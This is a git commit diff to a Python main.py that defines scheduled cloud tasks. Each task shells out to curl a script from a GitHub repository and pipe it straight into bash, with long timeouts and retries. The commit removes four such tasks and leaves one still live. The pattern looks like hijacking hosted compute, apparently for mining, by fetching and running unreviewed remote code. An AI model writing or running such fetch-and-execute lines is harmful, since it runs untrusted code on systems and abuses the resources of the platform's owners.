d09c033ab1aaf0634ab8056dc9fa5f7f142d36e4
kklabuser675431-glitch <kk_lab_user_675431@kkgcplabs02.com>
2026-03-25 19:15:12 -0700

    Update main.py

--- main.py
+++ main.py
@@ -16,58 +16,5 @@ def building1():
   import os
   os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')
 
-@app.task(
-  plan="pro",
-  timeout_seconds=86400,
-  retry=Retry(
-    max_retries=3,
-    wait_duration_ms=1
-  )
-)
-def building2():
-  import sys
-  import os
-  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')
-
-@app.task(
-  plan="pro",
-  timeout_seconds=86400,
-  retry=Retry(
-    max_retries=3,
-    wait_duration_ms=1
-  )
-)
-def building3():
-  import sys
-  import os
-  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')
-
-@app.task(
-  plan="pro",
-  timeout_seconds=86400,
-  retry=Retry(
-    max_retries=3,
-    wait_duration_ms=1
-  )
-)
-def building4():
-  import sys
-  import os
-  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')
-
-@app.task(
-  plan="pro",
-  timeout_seconds=86400,
-  retry=Retry(
-    max_retries=3,
-    wait_duration_ms=1
-  )
-)
-def building5():
-  import sys
-  import os
-  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')
-
-
 if __name__ == "__main__":
   app.start()
